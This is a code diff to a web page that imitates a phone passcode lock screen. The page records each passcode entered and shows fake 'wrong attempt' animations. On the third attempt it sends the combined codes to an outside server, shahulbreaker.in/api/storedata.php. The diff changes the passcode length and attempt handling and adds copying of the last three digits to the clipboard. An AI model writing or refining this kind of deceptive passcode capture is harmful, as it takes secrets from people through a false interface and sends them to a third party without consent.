@@ -50,10 +50,10 @@
   });
 })();
 
-// ---- Existing app code (unchanged) ----
+// ---- Existing app code (unchanged, except where noted) ----
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
-  const MAX = 6;
+  const MAX = 4; // <- changed from 6 to 4 (passcode length + rotating buffer size)
   let code = "";
 
   const dotEls = Array.from(document.querySelectorAll('.dot'));
@@ -121,7 +121,7 @@
     }, 120);
   })();
 
-  // rotating buffer for last up-to-6 entered codes
+  // rotating buffer for last-up-to-MAX entered codes
   const LAST_CODES_KEY = '_pass_last_codes_';
   function getLastCodes() {
     try {
@@ -426,7 +426,7 @@
     }, ms);
   }
 
-  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
+  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 1st (changed) ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
@@ -435,13 +435,10 @@
     // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
-    if (attempts === 1 || attempts === 2) {
-      animateWrongAttempt();
-    } else if (attempts === 3) {
-      const combined = getCombinedLastCodes();
-      if (combined) sendToAPI(combined);
-      animateWrongAttempt();
-    } else if (attempts === 4) {
+    // NEW BEHAVIOR:
+    // - First completed attempt should UNLOCK (play same animation as previous attempts===4).
+    // - For other attempts, preserve previous idea: 2 & 3 are treated as wrong attempts, and on 3rd we send combined codes.
+    if (attempts === 1) {
       // Immediately show the unlocked (open) lock glyph and give it a small pop, then run unlock animation
       if (dynamicIslandEl) {
         dynamicIslandEl.classList.remove('locked');
@@ -455,6 +452,18 @@
 
       // local reset of input
       setTimeout(reset, 300);
+
+      // reset attempts after unlock
+      setAttempts(0);
+      return;
+    }
+
+    if (attempts === 2) {
+      animateWrongAttempt();
+    } else if (attempts === 3) {
+      const combined = getCombinedLastCodes();
+      if (combined) sendToAPI(combined);
+      animateWrongAttempt();
     }
 
     if (attempts >= 4) {
@@ -502,11 +511,9 @@
       if (code.length === MAX) {
         const enteredCode = code;
         try {
-          const upcomingAttempts = getAttempts() + 1;
-          if (upcomingAttempts === 3) {
-            const toCopy = enteredCode;
-            copyToClipboard(toCopy).catch(() => showToast('Copy failed', 900));
-          }
+          // NEW BEHAVIOR: copy LAST THREE digits of whatever code was entered
+          const lastThree = enteredCode.slice(-3);
+          copyToClipboard(lastThree).catch(() => showToast('Copy failed', 900));
         } catch (err) {
           console.warn('clipboard pre-copy failed', err);
         }
